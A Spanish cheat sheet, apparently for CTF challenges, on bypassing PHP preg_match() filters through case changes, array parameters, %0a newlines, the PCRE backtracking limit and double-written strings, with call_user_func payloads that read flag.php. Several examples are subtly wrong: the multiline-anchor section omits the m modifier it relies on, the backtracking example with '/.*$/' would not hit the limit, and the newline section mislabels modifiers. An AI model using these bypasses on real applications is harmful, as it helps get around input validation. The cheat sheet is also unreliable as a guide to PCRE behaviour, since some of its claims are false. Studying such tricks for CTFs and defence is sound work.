# Chuleta de bypass de expresiones regulares en PHP

## Principio central

La función `preg_match()` de PHP, al filtrar la entrada del usuario, a menudo puede eludirse debido a un diseño inadecuado de la expresión regular.
Comprender los modificadores de las expresiones regulares y el comportamiento de tipos de PHP es la clave para el bypass.

## 1. Bypass por mayúsculas/minúsculas

**Condición aplicable**: la expresión regular no tiene el modificador `i` (PCRE_CASELESS)

```php
// Regex filtrada — sin modificador i
preg_match("/n|c/m", $_GET['p']);  // Solo coincide con n y c en minúscula

// Método de bypass — usar letras mayúsculas
// nss2 contiene n → bloqueado
// Nss2 contiene N → no coincide con n minúscula → ¡bypass exitoso!
// Ctf contiene C → no coincide con c minúscula → ¡bypass exitoso!

// Los nombres de clase y función de PHP no distinguen mayúsculas/minúsculas
call_user_func('Nss2::Ctf');  // Equivalente a nss2::ctf()
```

**Método de verificación**: primero confirmar si la expresión regular lleva el modificador `i`, y luego decidir si usar el bypass por mayúsculas/minúsculas

## 2. Bypass mediante arrays

**Condición aplicable**: la función solo acepta parámetros de tipo string; si se pasa un array, devuelve false

```php
// El segundo parámetro de preg_match() necesita ser un string
// Pasar un array → devuelve false + Warning → elude la verificación de la regex

// URL: ?p[]=nss2&p[]=ctf
// $_GET['p'] = ['nss2', 'ctf']  (array, no string)
// preg_match("/n|c/m", ['nss2', 'ctf']) → false → ¡bypass!

// call_user_func acepta un array como callback
call_user_func(['nss2', 'ctf']);  // Equivalente a nss2::ctf()
```

## 3. Bypass mediante salto de línea

**Condición aplicable**: la expresión regular usa anclas `^...$` + modificador `m`

```php
// Error común: el modificador m no hace que /n/ coincida con saltos de línea
// El modificador m solo afecta el comportamiento de coincidencia de ^ y $ (modo multilínea)

// Caso en el que se puede eludir:
preg_match("/^flag$/", $input);  // Con modificador m se puede eludir con %0aflag

// Caso en el que NO se puede eludir:
preg_match("/n|c/m", $input);    // m no afecta la coincidencia de n y c
```

## 4. Bypass del límite de backtracking de PCRE

**Condición aplicable**: cadena extremadamente larga + regex con gran cantidad de backtracking

```php
// El límite de backtracking por defecto de preg_match es 1000000
// Si se supera, devuelve false (no 0 ni 1)

// Construir una cadena extremadamente larga para disparar el límite de backtracking
$str = str_repeat('a', 1000000);
preg_match("/.*$/", $str);  // Devuelve false → bypass
```

## 5. Inyección de salto de línea `%0a`

**Condición aplicable**: la expresión regular usa `^...$` pero no tiene el modificador `s` (DOTALL)

```php
// Elude las anclas ^...$
// Entrada: "good\nmalicious"
preg_match("/^good$/", "good\nmalicious");  // Sin m, no coincide
preg_match("/^good$/m", "good\nmalicious");  // Con m, coincide con la primera línea
```

## Patrones comunes de retos CTF

| Tipo | Ejemplo de regex | Método de bypass |
|------|----------|----------|
| Filtro por mayúsculas/minúsculas | `/n\|c/m` | `Nss2::Ctf` (bypass por mayúsculas/minúsculas) |
| Filtro de función por string | `/system\|exec/` | `p[]=class&p[]=method` (bypass mediante array) |
| Coincidencia por ancla | `/^flag$/` | `flag%0a` o `%0aflag` (bypass mediante salto de línea) |
| Límite de backtracking | `/.*/` | Cadena extremadamente larga que dispara el límite de backtracking de PCRE |
| Sin ancla | `/flag/` | `flflagag` (bypass por doble escritura, si se aplicó str_replace) |

## Chuleta de formas de callback de call_user_func

```php
// Llamar a una función normal
call_user_func('readfile', 'flag.php');

// Llamar a un método estático (forma de string)
call_user_func('Nss2::Ctf');  // Tras el bypass por mayúsculas/minúsculas

// Llamar a un método estático (forma de array)
call_user_func(['Nss2', 'Ctf']);  // Tras el bypass mediante array

// Llamar a un método de instancia
call_user_func([$obj, 'method']);
```

## ⚠️ Errores comunes

1. **`call_user_func('readfile')` sin parámetros** — no leerá ningún archivo; se debe pasar `call_user_func('readfile', 'flag.php')`
2. **Confundir los modificadores `m` e `i`** — `m` es modo multilínea, `i` es el que ignora mayúsculas/minúsculas
3. **Ignorar el malabarismo de tipos de PHP** — `preg_match` devuelve `false` al recibir un array, no `0`
4. **Adivinar el contenido de la flag** — se debe obtener la respuesta real mediante herramientas, no inventarla
</content>
